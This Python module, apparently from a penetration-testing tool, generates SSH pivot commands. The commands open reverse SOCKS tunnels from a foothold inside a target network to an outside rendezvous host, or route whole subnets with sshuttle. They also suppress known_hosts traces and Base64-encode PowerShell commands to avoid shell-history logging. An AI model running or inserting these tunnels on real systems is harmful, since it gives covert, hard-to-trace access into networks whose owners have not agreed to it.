"""sshim command-plan generator — the revshells-style core of Phase 1.

Pure functions: a Profile + a session's random ports in, four renderings of two
legs out. No Flask, no DB, no docker, no lotek/`app.*` import. This is the piece
that ships the use case with zero core changes. Folded verbatim (behaviour-wise)
from the proven `sshim_gen.py` (11/11 tested), plus two Phase-1 additions:

* :func:`encode_command` — the revshells-style post-transform (None/URL/URL-double/Base64).
* :func:`effective_status` / :func:`is_listable` — the ONE liveness predicate every
  surface (list page, detail view, machine API) calls. `expired` is DERIVED from
  `expires_at`, never stored: no sweeper, no second copy to drift.

Topologies
----------
A. relay_reverse_socks  — both sides behind NAT, rendezvous is a 3rd-party box.
   anchor:  ssh -N -R 127.0.0.1:<socks> <ru>@<rh> -p <rport>
   operator: ssh -N -L <lsocks>:127.0.0.1:<socks> <ru>@<rh> -p <rport>
   Remote DNS is FREE: the anchor's ssh client resolves names inside the target
   network (bare -R = remote dynamic forward; OpenSSH >= 7.6).

B. direct_socks          — anchor has a routable address (public IP / tailnet).
   operator: ssh -N -D <lsocks> <au>@<anchor> -p <aport>
   OpenSSH resolves LOCALLY here, so this is NOT socks5h remote DNS. Stated, not
   hidden.

C. relay_sshuttle        — Linux operator wants full-subnet L3, not per-app SOCKS.
   anchor:  ssh -N -R 127.0.0.1:<jump>:127.0.0.1:22 <ru>@<rh> -p <rport>
   operator: sshuttle --dns -e 'ssh -J <ru>@<rh>:<rport>' -r <au>@127.0.0.1:<jump> <cidr>
   Anchor needs Python 3; operator needs sudo. Documented.

Port model
----------
No reservation. sshim picks a random loopback port on the rendezvous per session;
both legs use the same number. If two sessions collide on the same rendezvous, the
second `ssh -R` fails immediately under ExitOnForwardFailure=yes and sshim
regenerates. There is no TOCTOU because there is no allocator to race against.

Residue honesty
---------------
`ssh` writes a known_hosts line. Every emitted command carries
`-o UserKnownHostsFile=/dev/null` (POSIX) or the NUL equivalent (Windows) and
`-o StrictHostKeyChecking=accept-new -o LogLevel=ERROR`. Shell history on a
borrowed box is the one residue left; the UI says so, does not pretend otherwise.
The credential is NEVER placed on argv (visible in `ps`); the operator pastes it
at the prompt.

Credential model (this reverses the old "shown once, never stored" rule)
-----------------------------------------------------------------------
Every session gets its OWN randomly generated low-privilege identity —
:func:`gen_user` (``p`` + 8 hex: starts with a letter, 9 chars, legal on a Linux
``useradd`` and on a Windows OpenSSH server) and :func:`gen_password` (18+
visible chars). Both live on the :class:`Session` and are threaded into EVERY
command in place of an old shared literal user, for both legs. A profile may pin
an explicit user (:attr:`Profile.rendezvous_user` / :attr:`Profile.anchor_user`,
non-empty wins — an operator who owns the account) and the explicit value wins
over the generated one; one predicate, :func:`rendezvous_identity` /
:func:`anchor_identity`, decides that for every leg.

The password IS persisted now (sealed, see :mod:`sshim.secretbox`) because the
borrowed-box re-fetch case needs it back: an owner/admin opening the session
detail sees the identity again. It is still never on argv, so a stored session
re-renders to byte-identical commands.

What this does NOT do — read this before promising anyone a login
---------------------------------------------------------------
A generated ``ssh_user``/``ssh_password`` only works if something PROVISIONS that
account on the rendezvous host. sshim does not create accounts:

* an sshim-managed relay **container** provisions it from the ``USER_NAME`` /
  ``USER_PASSWORD`` env vars (the ``lotek-pivot-sshd`` image already supports it);
* an **externally-owned** rendezvous (a VPS, the lotek host's own sshd) gets
  nothing — sshim cannot mint an account there, so the operator must pin a real
  user in the profile (or accept that the pasted credential must already exist).
"""

from __future__ import annotations

import base64
import dataclasses
import secrets
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timedelta

# ── data ─────────────────────────────────────────────────────────────────────

TOPOLOGIES = ("relay_reverse_socks", "direct_socks", "relay_sshuttle")
RENDERERS = ("posix", "ssh_exe", "powershell_encoded", "sshuttle")
ENCODINGS = ("none", "url", "url_double", "base64")
_PORT_MIN, _PORT_MAX = 1024, 65535


@dataclass(frozen=True)
class Profile:
    """A named target. Switching targets is a dropdown, not a re-typed command.

    An EMPTY ``rendezvous_user``/``anchor_user`` means "generate a fresh per-pivot identity" (the
    default, and the secure one). A non-empty value is an explicit pin — an operator who really owns
    that account on the box — and wins over the generated identity (see :func:`rendezvous_identity`).
    Same convention as ``cidr``: empty means "decide it per session", never "the literal empty user".
    """
    name: str
    topology: str
    # rendezvous (topology A/C) — the always-on box both legs dial.
    rendezvous_host: str | None = None
    rendezvous_port: int = 22
    rendezvous_user: str = ""          # "" = random per-pivot identity
    # anchor (topology B; also the sshd box for topology C).
    anchor_host: str | None = None
    anchor_port: int = 22
    anchor_user: str = ""              # "" = random per-pivot identity
    # subnet to route (topology C only). "" = let sshuttle -N auto-detect.
    cidr: str = ""


@dataclass(frozen=True)
class Session:
    """One minted shim: this pivot's OWN identity + the random ports, for a single use."""
    profile: Profile
    socks_port: int            # loopback on rendezvous (A) / operator (B)
    jump_port: int             # loopback on rendezvous exposing anchor sshd (C)
    ssh_user: str              # this pivot's low-privilege username (see gen_user)
    ssh_password: str          # pasted at the prompt, never on argv; sealed at rest by service
    ttl_minutes: int = 30


def random_port() -> int:
    """A random TCP port in the ephemeral range. Not reserved — see module docstring."""
    return secrets.randbelow(_PORT_MAX - _PORT_MIN) + _PORT_MIN


def mint(profile: Profile, *, ttl_minutes: int = 30) -> Session:
    """Pick the session's random ports + a fresh throwaway identity. No side effects."""
    return Session(
        profile=profile,
        socks_port=random_port(),
        jump_port=random_port(),
        ssh_user=gen_user(),
        ssh_password=gen_password(),
        ttl_minutes=ttl_minutes,
    )


#: The credential model: ONE random password per pivot, pasted at the ssh prompt, valid for a single
#: session. There is deliberately no key generation — `ssh -i` needs a key FILE on the borrowed box,
#: which is exactly the residue a throwaway pivot must not leave.
MIN_PASSWORD_LENGTH = 18
_PASSWORD_ENTROPY_BYTES = 18

#: A per-pivot username is ``p`` + 8 hex. The leading LETTER is not cosmetic: Linux `useradd` refuses a
#: name that starts with a digit, and Windows OpenSSH accounts follow the same shape. 9 characters keeps
#: it inside the 16-char ceiling both accept (and `MAX_USER`).
_USER_PREFIX = "p"
_USER_HEX_BYTES = 4
MAX_GENERATED_USER_LENGTH = 16


def gen_user() -> str:
    """A fresh per-pivot low-privilege username: :data:`_USER_PREFIX` + 8 hex (9 chars, always).

    Legal on both a Linux ``useradd`` (no leading digit, ``[a-z0-9]`` only) and a Windows OpenSSH
    server, and short enough to stay inside the 16-character ceiling. Generated for every session, so
    two pivots never share a login; a profile may still PIN a real user (see
    :func:`rendezvous_identity`)."""
    return _USER_PREFIX + secrets.token_hex(_USER_HEX_BYTES)


def gen_password() -> str:
    """The per-pivot rendezvous secret: URL-safe, at least :data:`MIN_PASSWORD_LENGTH` visible characters
    (``token_urlsafe(18)`` is always exactly 24). Pasted at the prompt, never on argv.

    Public (not `_`-prefixed) because the mint surface shows it and the owner can re-fetch it — the row
    holds it SEALED (:mod:`sshim.secretbox`), never as cleartext."""
    return secrets.token_urlsafe(_PASSWORD_ENTROPY_BYTES)


# ── per-session identity — ONE predicate every command builder calls ──────────

def rendezvous_identity(profile: Profile, session: Session) -> str:
    """The username BOTH legs dial at the rendezvous: the profile's explicit pin, else this pivot's own
    generated user.

    This is the ONE home for that decision. Topology A's two legs must agree (they are the same
    account on the same box), and topology C's ``-J`` jump uses it too — so a call site that wrote
    ``profile.rendezvous_user or ...`` itself would be a second copy of a rule that can drift."""
    return profile.rendezvous_user or session.ssh_user


def anchor_identity(profile: Profile, session: Session) -> str:
    """The username a leg dials on the ANCHOR box (topology B's ``-D``, topology C's sshuttle ``-r``).

    Same rule as :func:`rendezvous_identity`; it is a separate function only because the two boxes are
    different hosts with different pins."""
    return profile.anchor_user or session.ssh_user


# ── shared ssh option strings ────────────────────────────────────────────────

# Disposable: no known_hosts, accept-new host key, quiet. Loopback-only forwards.
_POSIX_OPTS = (
    "-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=accept-new "
    "-o LogLevel=ERROR -o ExitOnForwardFailure=yes -o ServerAliveInterval=15 "
    "-o ServerAliveCountMax=3 -N"
)
# Windows ssh.exe: NUL device for known hosts. Same options, NUL spellings.
_WIN_OPTS = (
    "-o UserKnownHostsFile=NUL -o StrictHostKeyChecking=accept-new "
    "-o LogLevel=ERROR -o ExitOnForwardFailure=yes -o ServerAliveInterval=15 "
    "-o ServerAliveCountMax=3 -N"
)


def _validate(profile: Profile) -> None:
    if profile.topology not in TOPOLOGIES:
        raise ValueError(f"topology must be one of {TOPOLOGIES}, got {profile.topology!r}")
    if profile.topology in ("relay_reverse_socks", "relay_sshuttle") and not profile.rendezvous_host:
        # sshim ships NO rendezvous default: a fixed, well-known inbound port is the one thing this
        # design must not hand an operator, so an empty rendezvous is a configure-me error, not a default.
        raise ValueError(
            "Rendezvous host is required for this topology — give the address of the always-on box "
            "both legs dial (a VPS or tailnet host you control)."
        )
    if profile.topology == "direct_socks" and not profile.anchor_host:
        # name the field the operator must fill (anchor_host) AND what it is, so the message stands on
        # its own wherever it surfaces — the mint form, the machine api, or a test.
        raise ValueError(
            "Anchor host is required for the Direct topology — give the address of your foothold "
            "inside the target network (anchor_host)."
        )
    if profile.topology == "relay_sshuttle" and not profile.anchor_host:
        raise ValueError(
            "Anchor host is required for the sshuttle topology — give the sshd box inside the target "
            "network that sshuttle connects through (anchor_host)."
        )


# ── topology A: relay + reverse SOCKS5 (remote DNS free) ─────────────────────

def _anchor_cmd_a(sess: Session, renderer: str) -> str:
    p = sess.profile
    target = f"{rendezvous_identity(p, sess)}@{p.rendezvous_host}"
    port = f"-p {p.rendezvous_port}"
    fwd = f"-R 127.0.0.1:{sess.socks_port}"
    if renderer == "posix":
        return f"ssh {fwd} {_POSIX_OPTS} {port} -- {target}"
    if renderer == "ssh_exe":
        return f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}"
    if renderer == "powershell_encoded":
        return _powershell_encoded(f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}")
    raise ValueError(f"topology A anchor has no {renderer!r} rendering; use posix/ssh_exe/powershell_encoded")


def _operator_cmd_a(sess: Session, renderer: str) -> str:
    p = sess.profile
    local = sess.socks_port  # operator reuses the same loopback number for clarity
    target = f"{rendezvous_identity(p, sess)}@{p.rendezvous_host}"
    port = f"-p {p.rendezvous_port}"
    fwd = f"-L {local}:127.0.0.1:{sess.socks_port}"
    hint = (
        f"  # then point your browser/CLI at socks5h://127.0.0.1:{local} "
        f"(remote DNS — the anchor resolves names)"
    )
    if renderer == "posix":
        return f"ssh {fwd} {_POSIX_OPTS} {port} -- {target}{hint}"
    if renderer == "ssh_exe":
        return f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}{hint}"
    if renderer == "powershell_encoded":
        return _powershell_encoded(f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}") + hint
    raise ValueError(f"topology A operator has no {renderer!r} rendering")


# ── topology B: direct SOCKS (anchor routable) ──────────────────────────────

def _operator_cmd_b(sess: Session, renderer: str) -> str:
    p = sess.profile
    target = f"{anchor_identity(p, sess)}@{p.anchor_host}"
    port = f"-p {p.anchor_port}"
    fwd = f"-D {sess.socks_port}"
    # NOTE: -D resolves on the OPERATOR, not the anchor. Not socks5h. Stated.
    hint = (
        f"  # socks5://127.0.0.1:{sess.socks_port} — NOTE: OpenSSH -D resolves DNS "
        f"locally (operator), so this is NOT remote DNS. Use topology A for that."
    )
    if renderer == "posix":
        return f"ssh {fwd} {_POSIX_OPTS} {port} -- {target}{hint}"
    if renderer == "ssh_exe":
        return f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}{hint}"
    if renderer == "powershell_encoded":
        return _powershell_encoded(f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}") + hint
    raise ValueError(f"operator has no {renderer!r} rendering; use posix/ssh_exe/powershell_encoded")


# ── topology C: relay + sshuttle (full-subnet L3, Linux operator) ────────────

def _anchor_cmd_c(sess: Session, renderer: str) -> str:
    p = sess.profile
    # expose the anchor's OWN sshd on the rendezvous loopback at jump_port
    target = f"{rendezvous_identity(p, sess)}@{p.rendezvous_host}"
    port = f"-p {p.rendezvous_port}"
    fwd = f"-R 127.0.0.1:{sess.jump_port}:127.0.0.1:22"
    if renderer == "posix":
        return f"ssh {fwd} {_POSIX_OPTS} {port} -- {target}"
    if renderer == "ssh_exe":
        return f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}"
    if renderer == "powershell_encoded":
        return _powershell_encoded(f"ssh.exe {fwd} {_WIN_OPTS} {port} -- {target}")
    raise ValueError(f"topology C anchor has no {renderer!r} rendering")


def _operator_cmd_c(sess: Session, renderer: str) -> str:
    p = sess.profile
    if renderer != "sshuttle":
        raise ValueError("topology C operator is sshuttle-only (needs sudo + Python on anchor)")
    cidr = p.cidr or "-N"  # -N = auto-detect all private subnets on the anchor
    jump = f"{rendezvous_identity(p, sess)}@{p.rendezvous_host}:{p.rendezvous_port}"
    remote = f"{anchor_identity(p, sess)}@127.0.0.1:{sess.jump_port}"
    # -x the operator-side gateway when the operator's LAN overlaps the target subnet (the
    # operator fills it in) — otherwise sshuttle would route the network you are sitting on.
    hint = (
        f"  # add -x <local_gateway>/32 if your own LAN overlaps {p.cidr or 'the target subnet'}; "
        f"needs sudo on the operator + Python on the anchor"
    )
    return f"sshuttle --dns -e 'ssh -J {jump}' -r {remote} {cidr}{hint}"


# ── powershell -EncodedCommand rendering ─────────────────────────────────────

def _powershell_encoded(cmd: str) -> str:
    """Wrap a cmd one-liner as `powershell -EncodedCommand <base64>`.

    Keeps the command out of the borrow box's shell history (powershell.exe logs
    the encoded form, not the cleartext). UTF-16LE + base64, per Microsoft's spec.
    """
    blob = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
    return "powershell -NoProfile -EncodedCommand " + blob


# ── encoding post-transform (revshells-style) ────────────────────────────────

def encode_command(cmd: str, encoding: str) -> str:
    """Apply an optional transport encoding to a rendered command (None/URL/URL-double/Base64).

    Independent of the renderer: a command is built once, then optionally wrapped for a transport
    that mangles spaces/quotes (a chat box, a URL param, a QR). `none` is identity. Base64 here is
    plain UTF-8 b64 of the whole string — distinct from the `powershell_encoded` RENDERER, which is
    UTF-16LE for powershell's own `-EncodedCommand`."""
    if encoding == "none":
        return cmd
    if encoding == "url":
        return urllib.parse.quote(cmd, safe="")
    if encoding == "url_double":
        return urllib.parse.quote(urllib.parse.quote(cmd, safe=""), safe="")
    if encoding == "base64":
        return base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    raise ValueError(f"encoding must be one of {ENCODINGS}, got {encoding!r}")


# ── the plan ─────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class Plan:
    """A rendered session. Each leg carries its own map of renderer -> command,
    because topology C's anchor (ssh) and operator (sshuttle) use different
    renderer families.
    """
    session: Session
    anchor: dict[str, str] = field(default_factory=dict)     # renderer -> command
    operator: dict[str, str] = field(default_factory=dict)   # renderer -> command
    notes: tuple[str, ...] = ()


# The renderers that apply to a normal ssh leg (every topology's anchor, and
# the operator legs of topologies A and B). Topology C's operator is sshuttle-only.
_SSH_RENDERERS = ("posix", "ssh_exe", "powershell_encoded")


def render_plan(sess: Session) -> Plan:
    """Build every applicable rendering of both legs for the session's topology.

    The password is deliberately NOT in any command — the operator pastes it at
    the ssh prompt. A command with the password on argv would leak it to every
    `ps` viewer on the borrowed box. The USERNAME is on argv (it has to be), which
    is why a per-pivot one is generated: the login is worthless without the secret.
    """
    _validate(sess.profile)
    t = sess.profile.topology
    anchor: dict[str, str] = {}
    operator: dict[str, str] = {}
    notes: list[str] = []

    if t == "relay_reverse_socks":
        for r in _SSH_RENDERERS:
            anchor[r] = _anchor_cmd_a(sess, r)
            operator[r] = _operator_cmd_a(sess, r)
        notes.append("Remote DNS: the anchor resolves names.")
    elif t == "direct_socks":
        for r in _SSH_RENDERERS:
            operator[r] = _operator_cmd_b(sess, r)
        notes.append("Direct -D resolves DNS locally — not remote DNS. Use Relay for that.")
    elif t == "relay_sshuttle":
        for r in _SSH_RENDERERS:
            anchor[r] = _anchor_cmd_c(sess, r)
        operator["sshuttle"] = _operator_cmd_c(sess, "sshuttle")
        notes.append("sshuttle: sudo here, Python 3 on the anchor.")



    notes.append(
        f"This pivot dials as {rendezvous_identity(sess.profile, sess)} — that account must exist on "
        "the rendezvous (an sshim relay container provisions it, an external box needs a pinned user)."
    )
    return Plan(session=sess, anchor=anchor, operator=operator, notes=tuple(notes))


# ── stored-session reconstruction (Phase 1 re-fetch) ─────────────────────────

#: Profile's own field names. ``params`` is a SUPERSET of these — sshim also stores session metadata
#: there (``relay_mode``, ``relay_handle``), which is about HOW the relay is provided, not a coordinate.
_PROFILE_FIELDS = frozenset(f.name for f in dataclasses.fields(Profile))


def profile_from_params(params: dict) -> Profile:
    """Rebuild a Profile from a stored snapshot, IGNORING keys that are not Profile fields.

    Handing the whole dict to ``Profile(**params)`` broke the moment ``params`` gained a key Profile
    does not have (relay_mode/relay_handle) — every re-fetch raised TypeError. Filtering makes the
    snapshot additive-safe: session metadata can grow without touching the profile contract.
    """
    known = {k: v for k, v in (params or {}).items() if k in _PROFILE_FIELDS}
    return Profile(**known)


def rebuild_session(
    params: dict,
    *,
    socks_port: int,
    jump_port: int,
    ttl_minutes: int,
    ssh_user: str = "",
    ssh_password: str = "",
) -> Session:
    """Rebuild a :class:`Session` from a stored profile-snapshot + the stored identity and ports.

    `params` is the JSON snapshot of the minting :class:`Profile` (``Profile`` field names). The
    identity comes off the session row: ``ssh_user`` as stored, and ``ssh_password`` already UNSEALED by
    the caller (:func:`sshim.service.plan_for`) — ``""`` means "the key could not read it", and every
    surface must then say so instead of presenting an empty secret as a real one. The rendered commands
    never contain the password either way, so the regenerated plan stays byte-identical to the mint one.
    """
    profile = profile_from_params(params)
    return Session(
        profile=profile,
        socks_port=socks_port,
        jump_port=jump_port,
        ssh_user=ssh_user,
        ssh_password=ssh_password,
        ttl_minutes=ttl_minutes,
    )


def profile_params(profile: Profile) -> dict:
    """The JSON-serialisable snapshot of a Profile to store on a session row."""
    return {
        "name": profile.name,
        "topology": profile.topology,
        "rendezvous_host": profile.rendezvous_host,
        "rendezvous_port": profile.rendezvous_port,
        "rendezvous_user": profile.rendezvous_user,
        "anchor_host": profile.anchor_host,
        "anchor_port": profile.anchor_port,
        "anchor_user": profile.anchor_user,
        "cidr": profile.cidr,
    }


# ── deviation-risk predicate — ONE home, every banner surface calls it ──────

#: How a session's rendezvous credential is obtained. Phase 1 mints exactly one kind
#: (:data:`CREDENTIAL_EPHEMERAL`); the other two are named so this predicate is TOTAL today and a later
#: slice that introduces a saved password or key has one place it MUST declare itself (an unknown value
#: raises — never a silent pass).
CREDENTIAL_EPHEMERAL = "ephemeral"  # one-use random password, shown once — the secure default
CREDENTIAL_PASSWORD = "password"    # a reusable password, still valid after this pivot dies
CREDENTIAL_KEY = "key"              # a saved, non-ephemeral key (needs a file on the borrowed box)
CREDENTIAL_KINDS = (CREDENTIAL_EPHEMERAL, CREDENTIAL_PASSWORD, CREDENTIAL_KEY)

#: Inbound ports a scanner reaches for first. sshim's own ports are random in ``1024..65535`` and so can
#: never be one of these — a rendezvous/anchor port here is an operator PINNING a well-known service port
#: on a public host, which is the exposure the risk banner is about.
WELL_KNOWN_SSH_PORTS = frozenset({21, 22, 23, 80, 443, 2222, 3389, 8080, 8443})


def inbound_surface(profile: Profile) -> tuple[str | None, int]:
    """``(host, port)`` of the ONE port this profile exposes to a public/third-party network.

    Topologies A/C expose the rendezvous's sshd; topology B dials the anchor's sshd directly, so the
    anchor port is the inbound one. Deciding that here keeps :func:`deviation_risks` topology-blind.
    """
    if profile.topology == "direct_socks":
        return profile.anchor_host, profile.anchor_port
    return profile.rendezvous_host, profile.rendezvous_port


def deviation_risks(profile: Profile, *, credential: str = CREDENTIAL_EPHEMERAL) -> tuple[str, ...]:
    """Every way this configuration deviates from sshim's secure default — the ONE predicate behind the
    deviation-risk banner, called by the mint page and the session detail alike.

    The secure default is *a random port on a box you control + a one-use 18-character password*; that
    configuration returns an empty tuple and every surface stays silent. Each returned item is a plain
    sentence stating one risk, in a stable order (inbound port, then credential). This predicate NEVER
    blocks a mint or a kill — it names the risk and lets the operator accept it.

    ``credential`` is the session's credential model (:data:`CREDENTIAL_KINDS`); an unknown value raises
    instead of passing quietly, so a future static-credential model cannot slip in un-warned.
    """
    if credential not in CREDENTIAL_KINDS:
        raise ValueError(f"credential must be one of {CREDENTIAL_KINDS}, got {credential!r}")
    risks: list[str] = []
    host, port = inbound_surface(profile)
    if host and (port < 1024 or port in WELL_KNOWN_SSH_PORTS):
        risks.append(
            f"Inbound port {port} on {host} is a fixed, well-known service port. sshim's default is a "
            "random high port; scanners and brute-force sweeps try 22 and 443 first."
        )
    if credential == CREDENTIAL_PASSWORD:
        risks.append(
            "This pivot uses a reusable password instead of a one-use ephemeral one — it stays valid "
            "after this session ends, on a box whose history may outlive the engagement."
        )
    elif credential == CREDENTIAL_KEY:
        risks.append(
            "This pivot uses a saved, non-ephemeral key instead of a one-use password — a key file has "
            "to be written to the borrowed box, so it can be read and reused after the pivot dies."
        )
    return tuple(risks)


def has_deviation_risk(profile: Profile, *, credential: str = CREDENTIAL_EPHEMERAL) -> bool:
    """True iff :func:`deviation_risks` has anything to say (the banner's visibility switch)."""
    return bool(deviation_risks(profile, credential=credential))


# ── liveness predicate — ONE home, every surface calls it ────────────────────

#: A died session (expired or killed) stays on the list this long so a TTL death is VISIBLE
#: (a disappeared pivot would look like a mystery 404). After this, it ages off the list.
LISTABLE_GRACE = timedelta(hours=1)

# Stored status values. `expired` is DERIVED from expires_at and is NEVER stored — storing it
# would need a sweeper and would be a second copy of the liveness fact that could drift.
STATUS_ACTIVE = "active"
STATUS_KILLED = "killed"
STATUS_EXPIRED = "expired"  # derived only, returned by effective_status


def dies_at(expires_at: datetime, *, kill_at: datetime | None = None) -> datetime:
    """When this session stops being live: the EARLIEST of its TTL and its opt-in kill date.

    One home for that arithmetic — the liveness predicate and the list window both need it, and two
    copies of a `min()` are exactly how a session stays "live" on one surface and dead on another.
    """
    return min(expires_at, kill_at) if kill_at is not None else expires_at


def effective_status(
    stored_status: str, expires_at: datetime, *, now: datetime, kill_at: datetime | None = None
) -> str:
    """The single liveness predicate: killed > expired > active.

    `stored_status` is the explicit operator action (`active`/`killed`). Expiry is computed here from
    the TWO bounds against `now` so there is exactly one place that decides whether a pivot is live:
    the TTL (`expires_at`, always present) and the opt-in `kill_at` (nullable). A reached `kill_at`
    reports the TERMINAL status `killed` — it is an explicit, operator-chosen bound, not a TTL that
    merely ran out — which is what makes the plan surface refuse it (see `service.plan_for`).
    """
    if stored_status == STATUS_KILLED:
        return STATUS_KILLED
    if kill_at is not None and now >= kill_at:
        return STATUS_KILLED
    if now >= expires_at:
        return STATUS_EXPIRED
    return STATUS_ACTIVE


def is_active(
    stored_status: str, expires_at: datetime, *, now: datetime, kill_at: datetime | None = None
) -> bool:
    """True iff the pivot is live right now (commands are expected to work)."""
    return effective_status(stored_status, expires_at, now=now, kill_at=kill_at) == STATUS_ACTIVE


def is_listable(
    expires_at: datetime,
    *,
    now: datetime,
    grace: timedelta = LISTABLE_GRACE,
    kill_at: datetime | None = None,
) -> bool:
    """Single list-visibility predicate: show active + recently-died sessions (within `grace`).

    "Died" is :func:`dies_at` — a kill date that lands before the TTL ages the row off on the same
    schedule an expired one would, so a killed pivot is visible for `grace` and then disappears.
    """
    return now < dies_at(expires_at, kill_at=kill_at) + grace
